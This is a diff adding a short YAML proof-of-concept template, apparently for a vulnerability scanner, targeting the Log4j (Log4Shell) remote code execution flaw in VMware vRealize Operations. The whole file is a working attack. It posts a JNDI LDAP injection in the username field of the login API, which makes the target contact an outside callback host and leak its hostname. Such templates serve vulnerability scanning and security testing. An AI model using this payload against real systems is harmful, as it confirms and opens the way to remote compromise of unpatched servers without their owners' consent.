@@ -1,0 +1,18 @@
+name: vrealize-operations-log4j-rce
+set:
+  reverse: newReverse()
+  reverseHost: reverse.url.host
+  reverseURL: reverse.url.path
+rules:
+  - method: POST
+    path: /suite-api/api/auth/token/acquire
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"username":"${jndi:ldap://${hostName}.{{reverseHost}}}","password":"admin"}
+    expression: |
+      reverse.wait(10)
+detail:
+  author: u21h2
+  links:
+        - https://github.com/u21h2/nacs
